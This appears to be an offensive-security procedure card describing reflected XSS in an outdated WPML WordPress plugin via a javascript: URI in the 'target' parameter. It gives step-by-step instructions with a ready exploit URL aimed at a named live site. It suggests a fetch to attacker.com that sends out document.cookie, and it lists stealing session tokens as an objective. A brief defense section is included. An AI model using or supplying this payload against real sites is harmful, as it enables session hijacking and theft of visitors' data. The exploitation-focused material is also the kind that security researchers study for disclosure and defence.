---
id: uuid-for-procedure
tags:
  - xss
  - wordpress
  - wpml
  - javascript-uri
  - reflected-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:26.789Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-javascript-URI-into-WPML-Target-Parameter

## Summary

This procedure exploits a reflected XSS vulnerability in an outdated WPML WordPress plugin by injecting a javascript: URI scheme into the 'target' parameter of the reminder_popup action, leading to immediate JavaScript execution in the browser upon page load.

## Description

The WPML plugin, used for multilingual WordPress sites, fails to properly sanitize the 'target' parameter in the reminder_popup endpoint, allowing attackers to inject javascript: URIs. When a victim loads the crafted URL (e.g., https://love.uber.com/australia/?icl_action=reminder_popup&target=javascript:alert(/test/);//), the browser interprets the parameter as a navigation target, executing the embedded JavaScript. This can result in theft of session cookies, keystroke logging, or other client-side attacks. The vulnerability stems from insufficient input validation in older plugin versions, affecting public-facing sites without authentication.

## Requirements

1. Access to a web browser for testing payloads
2. Target site running WordPress with vulnerable WPML plugin (e.g., pre-3.9.x versions)
3. No special credentials; attack is unauthenticated and remote

## Defense

Defensive measures and detection strategies:

- Update WPML plugin to the latest version with proper URI sanitization
- Implement Content Security Policy (CSP) to block inline JavaScript execution
- Validate and sanitize all URL parameters server-side, rejecting javascript: schemes
- Monitor access logs for suspicious parameter values containing 'javascript:'

## Objectives

1. Execute arbitrary JavaScript in the victim's browser context
2. Steal sensitive client-side data like session tokens
3. Demonstrate the vulnerability for reporting or exploitation

## Instructions

### Step 1: Craft the Payload

**Context**: URL-encode a javascript: payload to bypass basic filtering and inject it into the target parameter.

Use a text editor or online URL encoder to prepare the payload. For example, encode `javascript:alert(/test/);//` to `javascript%3aalert%28%2ftest%2f%29%3b%2f%2f`.

### Step 2: Construct and Access the Exploit URL

**Context**: Append the encoded payload to the vulnerable endpoint and load it in a browser to trigger execution.

Construct the full URL:

```url
https://love.uber.com/australia/?icl_action=reminder_popup&target=javascript%3aalert%28%2ftest%2f%29%3b%2f%2f
```

Open this URL in a web browser. The page will load and immediately execute the alert.

> The alert box confirms successful XSS. In a real attack, replace alert with malicious code like `fetch('https://attacker.com/steal?cookie=' + document.cookie)` for data exfiltration.

### Step 3: Verify Execution

**Context**: Check for signs of successful injection and plan escalation.

Inspect the browser console for errors and confirm the payload ran without interference. Test advanced payloads to access localStorage or form data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[wordpress]]
- [[wpml]]
- [[javascript-uri]]
